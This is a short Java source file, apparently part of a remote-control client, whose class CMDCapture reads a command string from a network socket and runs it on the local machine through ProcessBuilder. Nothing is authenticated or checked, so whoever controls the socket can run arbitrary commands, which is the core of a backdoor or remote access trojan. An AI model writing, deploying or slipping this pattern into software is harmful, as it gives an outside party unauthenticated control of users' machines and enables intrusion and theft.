package client;

import java.io.IOException;
import java.net.Socket;

public class CMDCapture {

    private Socket socket;
    private ProcessBuilder builder;

    private static boolean redo;

    public CMDCapture(Socket socket){
        this.socket = socket;
        letControl();
    }

    public void letControl(){
        try {
            byte[] bytes = socket.getInputStream().readAllBytes();
            String commandString = new String(bytes);
            if(!commandString.equals("") && !redo && !commandString.equals("d")){
                String[] splitted = commandString.split(" ");
                builder = new ProcessBuilder();
                builder.command(splitted);
                Process process = builder.start();
                Thread.sleep(1000);
                process.destroy();
                redo = true;
            }
            if(commandString.contains("d")) redo = false;
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
